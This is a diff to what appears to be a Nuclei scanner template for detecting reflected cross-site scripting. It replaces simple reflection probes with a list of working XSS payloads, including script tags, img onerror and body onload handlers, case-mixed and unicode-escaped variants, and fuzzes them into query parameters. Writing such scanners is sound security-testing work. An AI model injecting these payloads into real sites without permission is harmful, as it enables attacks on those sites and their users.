@@ -1,26 +1,31 @@
 id: reflected-xss
 
 info:
-  name: fuzz reflected xss
-  author: pdteam,0xKayala,leadlife
+  name: Reflected Cross Site Scripting
+  author: pdteam
   severity: medium
-  description: the template fuzz all params
   tags: xss,rxss,dast
 
 variables:
   first: "{{rand_int(10000, 99999)}}"
 
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
+  - method: GET
+    path:
+      - "{{BaseURL}}"
 
     payloads:
       reflection:
-        - "'\"><{{first}}>"
-        - "'><{{first}}>"
-        - "\"><{{first}}>"
+        - "'\"><{{first}}"
+        - "<img src=x onerror=alert({{first}})>"
+        - "<script>alert({{first}})</script>"
+        - "'><ScRiPt>alert({{first}})</sCrIpT>"
+        - "</script><ScRiPt>alert({{first}})</sCrIpT>"
+        - "</script><script>alert({{first}})</script>"
+        - "<body onload=alert({{first}})>"
+        - "<marquee><img src=x onerror=confirm({{first}})></marquee>"
+        - "'><img%20src=xxx:x%20\x20onerror=javascript:alert({{first}})>"
+        - "\u0022\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e"
 
     fuzzing:
       - part: query
@@ -41,4 +46,3 @@ http:
         part: header
         words:
           - "text/html"
-# digest: 4b0a00483046022100fe9d1b6a33bc101017c0dabac57b282164ad7a316747fb641b1be7dd534178b2022100b1b90ca968e766279c306212b849ce875ae2beaced34248794387b56192c1878:922c64590222798bb761d5b6d8e72950
